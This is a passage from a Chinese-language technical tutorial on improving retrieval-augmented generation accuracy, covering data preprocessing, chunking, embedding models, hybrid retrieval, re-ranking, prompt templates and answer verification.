需要手动设计数据结构存储元数据，例如在 Python 字典中嵌套存储，管理和查询非常原始</td><td><strong>非常基础</strong> - 需要手动编写代码实现元数据过滤，例如遍历字典进行条件判断，效率极低，功能极其有限</td><td><strong>非常基础</strong> - 直接删除内存中的数据即可，操作简单，但数据丢失后无法恢复，无持久化</td></tr></tbody></table><h1><span id="如何提升-rag-精度-improving-rag-accuracy">如何提升 RAG 精度 (Improving RAG Accuracy)</span></h1><p>提高 RAG 精度是一个迭代优化的过程，涉及多个环节的改进：</p><ol><li><p><strong>数据准备和预处理 (Data Preparation and Preprocessing):</strong></p><ul><li><p><strong>数据清洗:</strong> 去除噪声数据、重复数据、格式错误等，保证数据的质量。</p></li><li><p><strong>数据增强:</strong> 对数据进行扩充或转换，增加数据的多样性，例如使用同义词替换、回译等方法。</p></li><li><p><strong>文档结构化:</strong> 将非结构化文档转换为结构化或半结构化格式，例如将 PDF 文档转换为 Markdown 或 JSON 格式，方便后续处理和检索。</p></li><li><p><strong>元数据添加:</strong> 为文档添加相关的元数据，例如文档来源、创建时间、关键词等，用于过滤和提升检索相关性。</p></li></ul></li><li><p><strong>文本分块策略优化 (Chunking Strategy Optimization):</strong></p><ul><li><p><strong>固定大小分块:</strong> 简单易行，但可能破坏语义完整性。需要尝试不同的分块大小，找到最佳平衡点。</p></li><li><p><strong>语义分块:</strong> 根据句子、段落或章节等语义单元进行分块，尽量保持语义完整性。可以使用 NLTK, SpaCy 等 NLP 工具进行句子分割或段落识别。</p></li><li><p><strong>递归分块:</strong> 先将文档分成较大的块 (如章节)，再将大块递归地分成更小的块 (如段落、句子)，保留文档的层次结构。</p></li><li><p><strong>重叠分块:</strong> 相邻块之间存在一定的重叠部分，增加上下文的连续性，减少信息丢失。</p></li><li><p><strong>根据文档类型选择分块策略:</strong> 不同类型的文档 (如代码、论文、网页) 可能需要不同的分块策略。</p></li></ul></li><li><p><strong>Embedding 模型选择和优化 (Embedding Model Selection and Optimization):</strong></p><ul><li><p><strong>选择合适的 Embedding 模型:</strong> 根据任务类型和数据特点选择合适的 Embedding 模型。 例如，sentence-transformers 库提供了多种预训练的 sentence embeddings 模型，可以根据不同的语言和任务进行选择。</p></li><li><p><strong>微调 Embedding 模型:</strong> 如果预训练的 Embedding 模型在特定领域或数据集上效果不佳，可以考虑使用自己的数据微调 Embedding 模型，使其更适应特定任务。</p></li><li><p><strong>使用领域特定的 Embedding 模型:</strong> 针对特定领域 (如医学、法律) 使用预训练或微调的领域特定 Embedding 模型，可以获得更好的语义表示效果。</p></li></ul></li><li><p><strong>检索策略优化 (Retrieval Strategy Optimization):</strong></p><ul><li><p><strong>调整相似性搜索参数:</strong> 例如调整 k-NN 中的 k 值 (检索最近邻的数量)，尝试不同的距离度量。</p></li><li><p><strong>混合检索 (Hybrid Retrieval):</strong> 结合向量检索和关键词检索，利用关键词检索的精确性和向量检索的语义性，提高检索效果。例如，可以使用 Elasticsearch 或 OpenSearch 进行关键词检索，并结合向量数据库进行向量检索。</p></li><li><p><strong>查询扩展 (Query Expansion):</strong> 对用户查询进行扩展，增加查询的覆盖面，例如使用同义词、相关词或知识图谱进行查询扩展。</p></li><li><p><strong>多轮检索 (Multi-turn Retrieval):</strong> 在多轮对话场景中，考虑对话历史信息，进行上下文相关的检索。</p></li><li><p><strong>排序和重排序 (Ranking and Re-ranking):</strong> 对检索结果进行排序或重排序，将更相关的文档排在前面。可以使用基于相关性评分、流行度、用户反馈等指标进行排序。 可以使用更复杂的模型 (如 Cross-Encoder) 对初始检索结果进行重排序，提升精度。</p></li></ul></li><li><p><strong>Prompt 工程 (Prompt Engineering):</strong></p><ul><li><p><strong>设计清晰明确的 Prompt:</strong> Prompt 的质量直接影响 LLM 的生成效果。 设计清晰、具体、指令明确的 Prompt，引导 LLM 更好地利用检索到的上下文信息。</p></li><li><p><strong>上下文窗口管理:</strong> 有效管理 LLM 的上下文窗口，避免上下文信息超出窗口限制。 可以采用截断、压缩、摘要等方法处理过长的上下文。</p></li><li><p><strong>Few-shot Prompting:</strong> 在 Prompt 中提供少量示例，引导 LLM 学习如何根据上下文生成高质量的回答。</p></li><li><p><strong>Instruction Tuning:</strong> 使用指令微调后的 LLM 通常在 RAG 任务中表现更好，因为它们更擅长理解和执行指令，并利用上下文信息生成答案。</p></li></ul></li><li><p><strong>后处理和结果优化 (Post-processing and Result Optimization):</strong></p><ul><li><p><strong>答案抽取 (Answer Extraction):</strong> 从检索到的文档中抽取最相关的答案片段，而不是直接使用整个文档作为上下文。</p></li><li><p><strong>答案聚合 (Answer Aggregation):</strong> 如果从多个文档中检索到相关信息，将这些信息聚合起来生成更全面的答案。</p></li><li><p><strong>答案验证 (Answer Verification):</strong> 验证 LLM 生成的答案是否与检索到的文档一致，避免幻觉 (Hallucination) 问题。 可以使用事实性检测模型或知识图谱进行答案验证。</p></li><li><p><strong>引用来源 (Citation):</strong> 在生成答案时，引用相关的文档来源，提高答案的可信度和可追溯性。</p></li></ul></li><li><p><strong>评估和迭代 (Evaluation and Iteration):</strong></p><ul><li><p><strong>建立评估指标:</strong> 选择合适的评估指标来衡量 RAG 系统的精度，例如召回率 (Recall)、准确率 (Precision)、F1 值、NDCG (归一化折损累积增益) 等。</p></li><li><p><strong>进行评估实验:</strong> 定期对 RAG 系统进行评估实验，分析系统的优点和不足，找出改进方向。</p></li><li><p><strong>迭代优化:</strong> 根据评估结果，不断迭代优化 RAG 系统的各个环节，例如调整分块策略、优化 Embedding 模型、改进检索策略、优化 Prompt 等。</p></li><li><p><strong>A/B 测试:</strong> 尝试不同的优化策略，进行 A/B 测试，比较不同策略的效果，选择最佳策略。</p></li></ul></li></ol><h1><span id="rag-精度提升">RAG 精度提升：</span></h1><p>提升 RAG 精度是一个系统工程，需要从数据源头到最终结果的生成进行全链路优化。 我们可以将 RAG 流程分解为以下关键步骤，并针对每个步骤进行精度提升：</p><ol><li><p><strong>数据准备与预处理 (Data Preparation &amp; Preprocessing):</strong> 高质量的知识库是 RAG 精度的基石。</p></li><li><p><strong>文本分块策略优化 (Chunking Strategy Optimization):</strong> 合理的文本分块影响检索的上下文完整性和相关性。</p></li><li><p><strong>Embedding 模型选择与优化 (Embedding Model Selection &amp; Optimization):</strong> 强大的 Embedding 模型是语义检索的关键。</p></li><li><p><strong>检索策略优化 (Retrieval Strategy Optimization):</strong> 高效的检索策略确保找到最相关的文档片段。</p></li><li><p><strong>Prompt 工程优化 (Prompt Engineering Optimization):</strong> 精心设计的 Prompt 指导 LLM 更好地利用检索结果生成答案。</p></li><li><p><strong>后处理与结果优化 (Post-processing &amp; Result Optimization):</strong> 对 LLM 生成的答案进行优化和修正。</p></li><li><p><strong>评估与迭代 (Evaluation &amp; Iteration):</strong> 持续评估和迭代优化 RAG 系统。</p></li></ol><p><strong>以下详细展开每个环节的精度提升策略：</strong></p><p><strong>1. 数据准备与预处理 (Data Preparation &amp; Preprocessing):</strong></p><ul><li><p><strong>1.1 数据清洗 (Data Cleaning):</strong></p><ul><li><p><strong>去除噪声数据:</strong> 识别并去除知识库中的噪声数据，例如：</p><ul><li><p><strong>无关信息:</strong> 与主题无关的文本、广告、导航栏等。</p></li><li><p><strong>重复数据:</strong> 重复的段落、句子或文档。</p></li><li><p><strong>格式错误:</strong> HTML 标签、乱码字符、不一致的格式等。</p></li></ul></li><li><p><strong>数据去重策略:</strong></p><ul><li><p><strong>精确去重:</strong> 完全相同的文本块。</p></li><li><p><strong>模糊去重:</strong> 使用文本相似度算法 (例如 SimHash, MinHash) 检测和去除相似度高的文本块。</p></li></ul></li><li><p><strong>工具:</strong> 可以使用正则表达式、专门的数据清洗工具库 (如 Beautiful Soup, Scrapy) 或自定义脚本进行数据清洗。</p></li></ul></li><li><p><strong>1.2 数据增强 (Data Augmentation):</strong></p><ul><li><p><strong>扩充知识库多样性:</strong> 增加知识库中数据的多样性，提升模型的泛化能力。</p></li><li><p><strong>数据增强方法:</strong></p><ul><li><p><strong>同义词替换:</strong> 使用同义词词典或 WordNet 等工具替换文本中的词语。</p></li><li><p><strong>回译 (Back Translation):</strong> 将文本翻译成另一种语言，再翻译回原始语言，生成语义相近但表达不同的文本。</p></li><li><p><strong>随机插入/删除/替换词语:</strong> 在文本中随机插入、删除或替换词语，生成轻微扰动的文本。</p></li><li><p><strong>上下文增强:</strong> 结合文档的上下文信息，例如文档标题、章节标题等，增强文档表示。</p></li></ul></li><li><p><strong>注意:</strong> 数据增强应适度，避免引入错误或改变原始语义。</p></li></ul></li><li><p><strong>1.3 文档结构化 (Document Structuring):</strong></p><ul><li><p><strong>提升检索效率和相关性:</strong> 将非结构化文档转换为结构化或半结构化格式，方便后续处理和检索。</p></li><li><p><strong>结构化方法:</strong></p><ul><li><p><strong>Markdown 格式:</strong> 将文档转换为 Markdown 格式，保留标题、列表、代码块等结构信息。</p></li><li><p><strong>JSON 格式:</strong> 将文档解析为 JSON 格式，例如将文档分解为章节、段落、句子等结构，并添加元数据。</p></li><li><p><strong>表格化数据:</strong> 将表格数据提取并存储为结构化表格。</p></li><li><p><strong>知识图谱构建:</strong> 从文档中抽取实体和关系，构建知识图谱，用于更复杂的语义检索。</p></li></ul></li><li><p><strong>工具:</strong> 可以使用 Pandoc, Mammoth 等工具进行文档格式转换，使用 NLP 工具 (如 SpaCy, NLTK) 进行结构化解析。</p></li></ul></li><li><p><strong>1.4 元数据添加 (Metadata Annotation):</strong></p><ul><li><p><strong>辅助过滤和提升相关性:</strong> 为文档或文本块添加相关的元数据，用于过滤检索结果和提升相关性排序。</p></li><li><p><strong>元数据类型:</strong></p><ul><li><p><strong>文档来源:</strong> 例如网页 URL, 文档名称, 文件路径。</p></li><li><p><strong>创建时间/更新时间:</strong> 文档的时间戳信息。</p></li><li><p><strong>关键词/标签:</strong> 描述文档主题的关键词或标签。</p></li><li><p><strong>作者/发布者:</strong> 文档的作者或发布者信息。</p></li><li><p><strong>文档类型:</strong> 例如新闻报道, 技术文档, 博客文章。</p></li><li><p><strong>领域/主题:</strong> 文档所属的领域或主题分类。</p></li></ul></li><li><p><strong>元数据获取方法:</strong> 可以从文档本身提取 (例如从 HTML 标签中提取元数据)，也可以手动添加或使用外部知识库进行标注。</p></li></ul></li></ul><p><strong>2. 文本分块策略优化 (Chunking Strategy Optimization):</strong></p><ul><li><p><strong>2.1 分块大小选择 (Chunk Size Selection):</strong></p><ul><li><p><strong>平衡上下文完整性和检索粒度:</strong> 分块大小直接影响检索的上下文完整性和检索粒度。</p></li><li><p><strong>过大分块:</strong> 可能包含过多无关信息，降低检索精度，增加 LLM 处理上下文的负担。</p></li><li><p><strong>过小分块:</strong> 可能丢失上下文信息，导致语义不完整，影响 LLM 理解。</p></li><li><p><strong>最佳分块大小:</strong> 通常需要根据文档类型、任务类型和 Embedding 模型进行实验和调整。 常见的起始范围是 100-500 个词语。</p></li><li><p><strong>实验方法:</strong> 尝试不同的分块大小 (例如 100, 200, 300, 400, 500 词语)，评估 RAG 系统的精度，选择最佳分块大小。</p></li></ul></li><li><p><strong>2.2 分块策略类型 (Chunking Strategy Types):</strong></p><ul><li><p><strong>固定大小分块 (Fixed-size Chunking):</strong></p><ul><li><p><strong>简单易行:</strong> 将文档按固定词语数量或字符数量进行分块。</p></li><li><p><strong>缺点:</strong> 可能破坏句子、段落或语义单元的完整性，导致上下文割裂。</p></li></ul></li><li><p><strong>语义分块 (Semantic Chunking):</strong></p><ul><li><p><strong>保持语义完整性:</strong> 根据句子、段落或章节等语义单元进行分块。</p></li><li><p><strong>句子分块:</strong> 使用句子分割工具 (例如 NLTK, SpaCy) 将文档分割成句子。</p></li><li><p><strong>段落分块:</strong> 根据段落分隔符 (例如空行) 将文档分割成段落。</p></li><li><p><strong>章节分块:</strong> 根据文档的章节标题将文档分割成章节。</p></li><li><p><strong>优点:</strong> 更好地保持上下文语义完整性，提升检索相关性。</p></li></ul></li><li><p><strong>递归分块 (Recursive Chunking):</strong></p><ul><li><p><strong>保留文档层次结构:</strong> 先将文档分成较大的块 (例如章节)，再将大块递归地分成更小的块 (例如段落、句子)。</p></li><li><p><strong>适用于结构化文档:</strong> 例如技术文档、书籍等，可以保留文档的章节、段落、句子等层次结构。</p></li><li><p><strong>优点:</strong> 既能保持文档结构，又能提供不同粒度的上下文信息。</p></li></ul></li><li><p><strong>重叠分块 (Overlapping Chunking):</strong></p><ul><li><p><strong>增加上下文连续性:</strong> 相邻块之间存在一定的重叠部分，例如重叠若干个句子或词语。</p></li><li><p><strong>减少信息丢失:</strong> 避免因分块边界导致上下文信息丢失。</p></li><li><p><strong>优点:</strong> 提升上下文的连贯性，尤其对于长文档或复杂语义的文档。</p></li></ul></li><li><p><strong>实体感知分块 (Entity-Aware Chunking):</strong></p><ul><li><p><strong>围绕实体进行分块:</strong> 以实体为中心进行分块，确保实体及其相关上下文信息在同一个块中。</p></li><li><p><strong>提升实体相关任务精度:</strong> 例如命名实体识别、关系抽取等任务。</p></li><li><p><strong>方法:</strong> 可以使用 NER (命名实体识别) 模型识别文档中的实体，并根据实体位置进行分块。</p></li></ul></li><li><p><strong>根据文档类型选择分块策略:</strong> 不同类型的文档 (例如代码、论文、网页) 可能需要不同的分块策略。 代码文档可能更适合按代码块或函数进行分块，论文可能更适合按章节或段落进行分块。</p></li></ul></li><li><p><strong>2.3 分块工具选择 (Chunking Tool Selection):</strong></p><ul><li><p><strong>Python NLP 库:</strong> NLTK, SpaCy, Sentence Transformers 等库提供句子分割、段落识别等功能。</p></li><li><p><strong>专门的分块工具:</strong> 一些 RAG 框架或工具库 (如 LangChain) 提供了内置的分块工具，可以方便地实现不同的分块策略。</p></li><li><p><strong>自定义分块脚本:</strong> 根据具体需求，可以编写自定义的分块脚本，实现更精细的分块控制。</p></li></ul></li></ul><p><strong>3. Embedding 模型选择与优化 (Embedding Model Selection &amp; Optimization):</strong></p><ul><li><p><strong>3.1 Embedding 模型选择 (Embedding Model Selection):</strong></p><ul><li><p><strong>Sentence Embedding 模型:</strong> 优先选择 Sentence Embedding 模型，例如 Sentence-BERT, OpenAI Embeddings, Cohere Embeddings 等。 这些模型专门用于生成句子或段落级别的语义向量表示。</p></li><li><p><strong>模型类型:</strong></p><ul><li><p><strong>通用 Embedding 模型:</strong> 在通用语料库上预训练的模型，适用于通用场景，例如 sentence-transformers/all-mpnet-base-v2。</p></li><li><p><strong>领域特定 Embedding 模型:</strong> 在特定领域语料库上预训练或微调的模型，例如医学领域、法律领域等，适用于特定领域的 RAG 应用。 例如 sentence-transformers/allenai-specter (科学论文领域)。</p></li><li><p><strong>多语言 Embedding 模型:</strong> 支持多种语言的 Embedding 模型，适用于多语言 RAG 应用。 例如 sentence-transformers/paraphrase-multilingual-mpnet-base-v2。</p></li></ul></li><li><p><strong>模型性能指标:</strong> 关注模型的语义表示能力、向量维度、推理速度、资源消耗等指标。 可以参考 Sentence Embedding 模型排行榜 (如 MTEB Leaderboard) 选择性能较好的模型。</p></li><li><p><strong>模型服务:</strong> 可以选择本地部署的 Embedding 模型 (例如使用 Sentence-Transformers 库)，也可以使用云端 Embedding 服务 (例如 OpenAI Embeddings API, Cohere Embeddings API)。</p></li></ul></li><li><p><strong>3.2 Embedding 模型微调 (Embedding Model Fine-tuning):</strong></p><ul><li><p><strong>提升领域特定任务精度:</strong> 如果通用 Embedding 模型在特定领域或数据集上效果不佳，可以考虑使用自己的数据微调 Embedding 模型。</p></li><li><p><strong>微调方法:</strong></p><ul><li><p><strong>对比学习 (Contrastive Learning):</strong> 使用对比学习目标函数 (例如 InfoNCE Loss) 微调模型，使其更好地学习领域特定数据的语义表示。</p></li><li><p><strong>监督学习 (Supervised Learning):</strong> 如果有领域特定的标注数据 (例如问答对、相关文档对)，可以使用监督学习方法微调模型。</p></li></ul></li><li><p><strong>微调数据准备:</strong> 需要准备领域特定的数据集，例如领域相关的文档集、问答对、相似文档对等。</p></li><li><p><strong>微调工具:</strong> 可以使用 Sentence-Transformers 库提供的微调工具，或者使用 PyTorch, TensorFlow 等深度学习框架自定义微调流程.</p></li></ul></li><li><p><strong>3.3 Embedding 模型参数优化 (Embedding Model Parameter Optimization):</strong></p><ul><li><p><strong>向量维度选择:</strong> 向量维度影响模型的表示能力和计算效率。 高维度向量可以表达更丰富的语义信息，但计算和存储成本更高。 需要根据资源限制和性能需求选择合适的向量维度。</p></li><li><p><strong>模型量化 (Model Quantization):</strong> 使用模型量化技术 (例如 int8 量化) 减小模型大小，加速推理速度，降低资源消耗。 可以使用 ONNX Runtime, TensorRT 等推理加速引擎进行模型量化。</p></li></ul></li><li><p><strong>3.4 多 Embedding 模型融合 (Multi-Embedding Model Fusion):</strong></p><ul><li><p><strong>结合不同模型的优势:</strong> 可以使用多个 Embedding 模型，结合不同模型的优势，提升整体的语义表示能力。</p></li><li><p><strong>融合方法:</strong></p><ul><li><p><strong>向量拼接 (Vector Concatenation):</strong> 将不同模型的向量拼接在一起，形成一个更高维度的向量。</p></li><li><p><strong>加权平均 (Weighted Averaging):</strong> 对不同模型的向量进行加权平均，根据模型性能或任务类型分配不同的权重。</p></li><li><p><strong>模型集成 (Model Ensembling):</strong> 训练多个 Embedding 模型，并将它们的检索结果进行集成。</p></li></ul></li><li><p><strong>适用场景:</strong> 例如，可以使用通用 Embedding 模型和领域特定 Embedding 模型进行融合，提升通用性和领域特定任务的精度。</p></li></ul></li></ul><p><strong>4. 检索策略优化 (Retrieval Strategy Optimization):</strong></p><ul><li><p><strong>4.1 相似性搜索参数调整 (Similarity Search Parameter Tuning):</strong></p><ul><li><p><strong>调整 k-NN 中的 k 值:</strong> k 值表示检索最近邻的数量。 较大的 k 值可以检索到更多相关的文档片段，但也会增加噪声，降低精度。 较小的 k 值可能检索结果太少，导致信息不完整。 需要根据任务类型和数据特点调整 k 值。</p></li><li><p><strong>尝试不同的距离度量 (Distance Metric):</strong> 不同的距离度量 (例如 cosine similarity, Euclidean distance, dot product) 适用于不同的 Embedding 模型和数据分布。 需要根据 Embedding 模型和任务类型选择合适的距离度量。 Cosine similarity 常用于文本相似度计算。</p></li><li><p><strong>实验方法:</strong> 尝试不同的 k 值和距离度量，评估 RAG 系统的精度，选择最佳参数组合。</p></li></ul></li><li><p><strong>4.2 混合检索 (Hybrid Retrieval):</strong></p><ul><li><p><strong>结合向量检索和关键词检索:</strong> 利用关键词检索的精确性和向量检索的语义性，提高检索效果。</p></li><li><p><strong>关键词检索:</strong> 使用传统的关键词索引和搜索技术 (例如 TF-IDF, BM25) 进行关键词检索。</p></li><li><p><strong>向量检索:</strong> 使用向量数据库进行相似性搜索。</p></li><li><p><strong>混合方法:</strong></p><ul><li><p><strong>并行检索:</strong> 同时进行关键词检索和向量检索，并将结果合并。</p></li><li><p><strong>级联检索:</strong> 先使用关键词检索进行粗略筛选，再使用向量检索对筛选结果进行精细排序。</p></li><li><p><strong>加权融合:</strong> 根据关键词检索和向量检索的相关性评分，进行加权融合，生成最终的检索结果排序。</p></li></ul></li><li><p><strong>适用场景:</strong> 当用户查询既包含关键词信息，又包含语义信息时，混合检索可以更好地满足用户需求。</p></li></ul></li><li><p><strong>4.3 查询扩展 (Query Expansion):</strong></p><ul><li><p><strong>增加查询的覆盖面:</strong> 对用户查询进行扩展，增加查询的覆盖面，检索更多相关的文档片段。</p></li><li><p><strong>查询扩展方法:</strong></p><ul><li><p><strong>同义词扩展:</strong> 使用同义词词典或 WordNet 等工具扩展查询中的词语。</p></li><li><p><strong>相关词扩展:</strong> 使用词向量模型 (例如 Word2Vec, GloVe) 或语义网络扩展查询中的词语。</p></li><li><p><strong>知识图谱扩展:</strong> 使用知识图谱扩展查询中的实体和关系。</p></li><li><p><strong>查询改写:</strong> 使用查询改写模型 (例如基于 Transformer 的查询改写模型) 自动改写用户查询，使其更符合检索系统的输入要求。</p></li></ul></li><li><p><strong>注意:</strong> 查询扩展应适度，避免引入无关信息，降低检索精度。</p></li></ul></li><li><p><strong>4.4 多轮检索 (Multi-turn Retrieval):</strong></p><ul><li><p><strong>考虑对话历史信息:</strong> 在多轮对话场景中，考虑对话历史信息，进行上下文相关的检索。</p></li><li><p><strong>上下文融合方法:</strong></p><ul><li><p><strong>拼接对话历史:</strong> 将当前用户查询和之前的对话历史拼接在一起，作为新的查询输入。</p></li><li><p><strong>上下文向量表示:</strong> 使用对话历史编码器 (例如基于 RNN 或 Transformer 的对话历史编码器) 将对话历史编码成向量表示，并将其与当前查询的向量表示进行融合。</p></li><li><p><strong>注意力机制:</strong> 使用注意力机制 (例如 Transformer 的自注意力机制) 建模当前查询和对话历史之间的关系，提升上下文相关的检索精度。</p></li></ul></li><li><p><strong>适用场景:</strong> 对话系统、聊天机器人等需要多轮对话交互的 RAG 应用。</p></li></ul></li><li><p><strong>4.5 排序和重排序 (Ranking and Re-ranking):</strong></p><ul><li><p><strong>提升检索结果的排序质量:</strong> 对初始检索结果进行排序或重排序，将更相关的文档片段排在前面。</p></li><li><p><strong>排序方法:</strong></p><ul><li><p><strong>基于相关性评分排序:</strong> 根据向量数据库返回的相关性评分 (例如 cosine similarity) 进行排序。</p></li><li><p><strong>基于流行度排序:</strong> 根据文档的流行度 (例如被引用次数、点击次数) 进行排序。</p></li><li><p><strong>基于用户反馈排序:</strong> 根据用户对检索结果的反馈 (例如点击、点赞) 进行排序。</p></li><li><p><strong>重排序模型 (Re-ranking Model):</strong> 使用更复杂的模型 (例如 Cross-Encoder 模型) 对初始检索结果进行重排序，提升精度。 Cross-Encoder 模型可以更精细地计算查询和文档片段之间的相关性，但计算成本较高。 可以使用 Sentence-Transformers 库提供的 Cross-Encoder 模型。</p></li></ul></li><li><p><strong>适用场景:</strong> 需要高精度检索结果排序的 RAG 应用，例如问答系统、搜索引擎等。</p></li></ul></li></ul><p><strong>5. Prompt 工程优化 (Prompt Engineering Optimization):</strong></p><ul><li><p><strong>5.1 设计清晰明确的 Prompt (Clear and Specific Prompt Design):</strong></p><ul><li><p><strong>指令明确:</strong> Prompt 中明确指示 LLM 的任务和目标，例如 “请根据以下上下文回答问题”, “请总结以下文档”, “请从以下信息中提取关键信息”。</p></li><li><p><strong>上下文引导:</strong> 在 Prompt 中明确告知 LLM 上下文信息的来源和格式，例如 “上下文信息如下：”, “请参考以下文档片段：”。</p></li><li><p><strong>限制输出格式:</strong> 如果需要特定格式的输出 (例如 JSON 格式, 列表格式)，在 Prompt 中明确指示输出格式。</p></li><li><p><strong>避免歧义:</strong> Prompt 语言应简洁明了，避免歧义和模棱两可的表达。</p></li><li><p><strong>示例 Prompt:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">请根据以下上下文信息回答问题：</span><br><span class="line">上下文信息：[检索到的文档片段]</span><br><span class="line">问题：[用户问题]</span><br><span class="line">答案：</span><br></pre></td></tr></table></figure><p>content_copydownload</p><p>Use code <a href="https://support.google.com/legal/answer/13505487">with caution</a>.</p></li></ul></li><li><p><strong>5.2 上下文窗口管理 (Context Window Management):</strong></p><ul><li><p><strong>控制上下文长度:</strong> LLM 的上下文窗口长度有限制 (例如 GPT-3.5-turbo 的上下文窗口长度为 4096 tokens)。 需要控制 RAG 系统提供的上下文长度，避免超出 LLM 的上下文窗口限制。</p></li><li><p><strong>上下文截断 (Context Truncation):</strong> 如果检索到的上下文信息过长，可以进行截断，只保留最相关的部分。 可以根据相关性评分或文档片段的重要性进行截断。</p></li><li><p><strong>上下文压缩 (Context Compression):</strong> 使用上下文压缩技术 (例如摘要、信息抽取) 压缩上下文信息，减少上下文长度，同时尽量保留关键信息。</p></li><li><p><strong>多文档检索与摘要 (Multi-document Retrieval and Summarization):</strong> 如果检索到多个相关文档，可以先对每个文档进行摘要，再将摘要信息作为上下文提供给 LLM。</p></li><li><p><strong>分段式 Prompting (Segmented Prompting):</strong> 将长文档分成多个段落，分别生成 Prompt，分段输入 LLM，最后将结果整合。</p></li></ul></li><li><p><strong>5.3 Few-shot Prompting (Few-shot Prompting):</strong></p><ul><li><p><strong>提供示例引导 LLM 学习:</strong> 在 Prompt 中提供少量示例 (输入-输出对)，引导 LLM 学习如何根据上下文生成高质量的回答。</p></li><li><p><strong>示例选择:</strong> 示例应与当前任务相关，并能有效展示期望的输出格式和内容。</p></li><li><p><strong>示例数量:</strong> Few-shot Prompting 通常只需要少量示例 (例如 1-5 个示例)。</p></li><li><p><strong>示例 Prompt:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">以下是一些问答示例：</span><br><span class="line">示例 1：</span><br><span class="line">上下文信息：[示例上下文1]</span><br><span class="line">问题：[示例问题1]</span><br><span class="line">答案：[示例答案1]</span><br><span class="line"></span><br><span class="line">示例 2：</span><br><span class="line">上下文信息：[示例上下文2]</span><br><span class="line">问题：[示例问题2]</span><br><span class="line">答案：[示例答案2]</span><br><span class="line"></span><br><span class="line">现在请根据以下上下文信息回答问题：</span><br><span class="line">上下文信息：[检索到的文档片段]</span><br><span class="line">问题：[用户问题]</span><br><span class="line">答案：</span><br></pre></td></tr></table></figure><p>content_copydownload</p><p>Use code <a href="https://support.google.com/legal/answer/13505487">with caution</a>.</p></li></ul></li><li><p><strong>5.4 Instruction Tuning (Instruction Tuning):</strong></p><ul><li><p><strong>使用指令微调后的 LLM:</strong> 使用在指令数据集上微调后的 LLM (例如 InstructGPT, ChatGPT) 通常在 RAG 任务中表现更好，因为它们更擅长理解和执行指令，并利用上下文信息生成答案。</p></li><li><p><strong>Prompt 风格调整:</strong> 根据指令微调后的 LLM 的特点，调整 Prompt 的风格，例如更强调指令性、更简洁明了。</p></li><li><p><strong>选择合适的 LLM:</strong> 根据任务类型和性能需求，选择合适的指令微调后的 LLM (例如 GPT-3.5-turbo-instruct, GPT-4)。</p></li></ul></li></ul><p><strong>6. 后处理与结果优化 (Post-processing &amp; Result Optimization):</strong></p><ul><li><p><strong>6.1 答案抽取 (Answer Extraction):</strong></p><ul><li><p><strong>从检索文档中抽取答案片段:</strong> 从检索到的文档中抽取最相关的答案片段，而不是直接使用整个文档作为上下文。</p></li><li><p><strong>抽取方法:</strong></p><ul><li><p><strong>关键词匹配:</strong> 在检索文档中查找与问题关键词相关的句子或段落。</p></li><li><p><strong>阅读理解模型 (Reading Comprehension Model):</strong> 使用阅读理解模型 (例如 BERT-based QA 模型) 从检索文档中抽取答案片段。</p></li><li><p><strong>启发式规则:</strong> 根据文档结构和语义信息，设计启发式规则抽取答案片段。</p></li></ul></li><li><p><strong>优点:</strong> 可以更精准地提取答案信息，减少 LLM 处理无关信息的负担，提高答案的准确性和简洁性。</p></li></ul></li><li><p><strong>6.2 答案聚合 (Answer Aggregation):</strong></p><ul><li><p><strong>整合多个文档的信息:</strong> 如果从多个文档中检索到相关信息，将这些信息聚合起来生成更全面的答案。</p></li><li><p><strong>聚合方法:</strong></p><ul><li><p><strong>信息融合:</strong> 将多个文档的答案片段进行融合，去除冗余信息，整合相同或相似的信息。</p></li><li><p><strong>排序和选择:</strong> 根据文档的相关性评分或答案片段的重要性，对答案片段进行排序和选择，只保留最重要和最相关的答案片段。</p></li><li><p><strong>生成式摘要:</strong> 使用生成式摘要模型对多个文档的答案片段进行摘要，生成更简洁和流畅的答案。</p></li></ul></li><li><p><strong>适用场景:</strong> 需要综合多个信息源生成答案的 RAG 应用。</p></li></ul></li><li><p><strong>6.3 答案验证 (Answer Verification):</strong></p><ul><li><p><strong>验证答案的事实性:</strong> 验证 LLM 生成的答案是否与检索到的文档一致，避免幻觉 (Hallucination) 问题。</p></li><li><p><strong>验证方法:</strong></p><ul><li><p><strong>事实性检测模型 (Factuality Detection Model):</strong> 使用事实性检测模型判断 LLM 生成的答案是否与上下文信息一致。</p></li><li><p><strong>知识图谱验证:</strong> 使用知识图谱验证答案中涉及的实体和关系是否正确。</p></li><li><p><strong>人工审核:</strong> 对 LLM 生成的答案进行人工审核，检查答案的事实性和准确性。</p></li></ul></li><li><p><strong>纠正策略:</strong> 如果答案验证失败，可以采取以下纠正策略：</p><ul><li><p><strong>重新检索:</strong> 调整检索策略，重新检索更相关的文档。</p></li><li><p><strong>重新生成:</strong> 调整 Prompt 或 LLM 参数，重新生成答案。</p></li><li><p><strong>拒绝回答:</strong> 如果无法生成可靠的答案，拒绝回答用户问题。</p></li></ul></li></ul></li><li><p><strong>6.4 引用来源 (Citation):</strong></p><ul><li><p><strong>提高答案可信度和可追溯性:</strong> 在生成答案时，引用相关的文档来源，让用户可以追溯答案的来源信息，提高答案的可信度和可追溯性。</p></li><li><p><strong>引用格式:</strong> 可以使用脚注、尾注或内联引用的方式引用文档来源。</p></li><li><p><strong>来源信息:</strong> 引用信息可以包括文档标题、URL, 文档 ID, 文档片段编号等。</p></li></ul></li></ul><p><strong>7. 评估与迭代 (Evaluation &amp; Iteration):</strong></p><ul><li><p><strong>7.1 建立评估指标 (Evaluation Metric Establishment):</strong></p><ul><li><p><strong>选择合适的评估指标:</strong> 根据 RAG 任务类型选择合适的评估指标，例如：</p><ul><li><p><strong>召回率 (Recall):</strong> 检索到的相关文档片段占所有相关文档片段的比例。</p></li><li><p><strong>准确率 (Precision):</strong> 检索到的文档片段中相关文档片段的比例。</p></li><li><p><strong>F1 值:</strong> 召回率和准确率的调和平均值。</p></li><li><p><strong>NDCG (Normalized Discounted Cumulative Gain):</strong> 